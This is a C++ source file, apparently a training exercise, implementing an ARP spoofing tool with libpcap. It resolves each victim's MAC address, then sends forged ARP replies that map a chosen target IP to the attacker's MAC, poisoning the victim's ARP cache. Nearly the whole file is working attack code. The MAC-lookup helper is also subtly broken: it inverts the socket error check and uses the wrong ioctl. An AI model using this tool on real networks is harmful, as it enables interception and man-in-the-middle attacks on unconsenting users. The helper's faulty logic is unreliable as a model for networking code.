#include "main.h"
#include <ctime>

bool getLocalMAC(const char* dev, Mac &mac) { // mac -> value
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd > 0) {
        perror("socket");
        return false;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(fd);
        return false;
    }
    close(fd);
    mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    return true;
}

bool getLocalIp(const char* dev, Ip &ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return false;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(fd);
        return false;
    }
    close(fd);
    struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    ip = Ip(ntohl(addr->sin_addr.s_addr));
    return true;
}


int main(int argc, char* argv[]) {
    // sender & target addr
    if (argc < 4 || ((argc - 2) % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) failed: %s\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    // attacker's local MAC and IP addr
    Mac attacker_mac;
    Ip attacker_ip;
    if (!getLocalMAC(dev, attacker_mac)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    if (!getLocalIp(dev, attacker_ip)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    printf("Attacker MAC: %s\n", std::string(attacker_mac).c_str());
    printf("Attacker IP : %s\n", std::string(attacker_ip).c_str());

    // sender & target ip addr
    for (int i = 2; i < argc; i += 2) {
        Ip victim_ip(argv[i]);     // sender/victim IP
        Ip target_ip(argv[i+1]);     // target IP (the IP we want to spoof)

        // send arp request to get the victim's mac address
        // construct the arp request -> EthArpPacket
        EthArpPacket arp_req(
            ArpHdr::Request, // arp request
            Mac("FF:FF:FF:FF:FF:FF"),  // dst -> broadcast
            attacker_mac, // ethernet's src -> attacker's mac
            EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4,
            Mac::SIZE, Ip::SIZE,
            attacker_mac, attacker_ip,
            Mac("00:00:00:00:00:00"), victim_ip  // victim(target) -> unknown mac(we have to know this.._, victim ip
            );

        if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_req), sizeof(arp_req)) != 0) {
            fprintf(stderr, "Error sending ARP request: %s\n", pcap_geterr(pcap));
            continue;
        }
        printf("Sent ARP request for %s\n", std::string(victim_ip).c_str());

        // listen arp reply
        Mac victim_mac;
        bool received_reply = false;
        time_t start = time(NULL);
        while (time(NULL) - start < 5) {  // wait -> 5 sec
            struct pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res == 0) continue;
            if (res < 0) break;
            if (header->caplen < sizeof(EthArpPacket)) continue;

            EthArpPacket* arp_resp = (EthArpPacket*)packet;
            // arp reply check
            if (ntohs(arp_resp->arp_.op_) == ArpHdr::Reply) {
                // verify the ip -> sender ip == target ip
                if (arp_resp->arp_.sip() == victim_ip) {
                    victim_mac = arp_resp->arp_.smac();
                    received_reply = true;
                    break;
                }
            }
        }
        if (!received_reply) {
            fprintf(stderr, "Did not receive ARP reply from %s\n", std::string(victim_ip).c_str());
            continue;
        }
        printf("Victim %s MAC: %s\n", std::string(victim_ip).c_str(), std::string(victim_mac).c_str());

        // arp attack
        EthArpPacket arp_infect(
            ArpHdr::Reply, // arp reply
            victim_mac, // ethernet dst -> victim's mac
            attacker_mac, // ethernet src: attacker
            EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4,
            Mac::SIZE, Ip::SIZE,
            attacker_mac, target_ip, // arp sender? -> attacker's mac with spoofed IP = target IP
            victim_mac, victim_ip // arp target: victim's mac and ip
            );

        if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_infect), sizeof(arp_infect)) != 0) {
            fprintf(stderr, "Error sending ARP attack: %s\n", pcap_geterr(pcap));
            continue;
        }
        printf("Sent ARP packet to %s, changing ARP table.\n", std::string(victim_ip).c_str());
    }

    pcap_close(pcap);
    return EXIT_SUCCESS;
}

